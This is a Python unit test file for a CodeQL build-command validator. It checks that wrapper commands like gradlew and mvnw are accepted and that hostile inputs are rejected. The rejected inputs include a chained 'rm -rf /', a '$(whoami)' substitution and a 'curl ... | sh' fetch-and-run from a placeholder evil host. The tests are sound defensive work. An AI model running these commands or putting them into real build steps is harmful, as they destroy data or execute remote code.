"""Unit tests for CodeQL build-command validation."""

import unittest

from doc_engine.scanning.build_command import BuildCommandError, validate_build_command


class BuildCommandValidationTest(unittest.TestCase):
    def test_accepts_gradlew(self):
        cmd = '"gradlew.bat" --no-daemon clean compileJava'
        self.assertEqual(validate_build_command(cmd), cmd)

    def test_accepts_mvnw(self):
        cmd = 'mvnw --no-daemon clean compile'
        self.assertEqual(validate_build_command(cmd), cmd)

    def test_accepts_bash_wrapper(self):
        cmd = '"C:\\Program Files\\Git\\bin\\bash.exe" "gradlew" clean compileJava'
        self.assertEqual(validate_build_command(cmd), cmd)

    def test_rejects_shell_chaining(self):
        with self.assertRaises(BuildCommandError):
            validate_build_command("gradlew clean; rm -rf /")

    def test_rejects_command_substitution(self):
        with self.assertRaises(BuildCommandError):
            validate_build_command("gradlew clean $(whoami)")

    def test_rejects_unknown_tool(self):
        with self.assertRaises(BuildCommandError):
            validate_build_command("curl https://evil.example/install.sh | sh")

    def test_rejects_empty(self):
        with self.assertRaises(BuildCommandError):
            validate_build_command("")


if __name__ == "__main__":
    unittest.main()
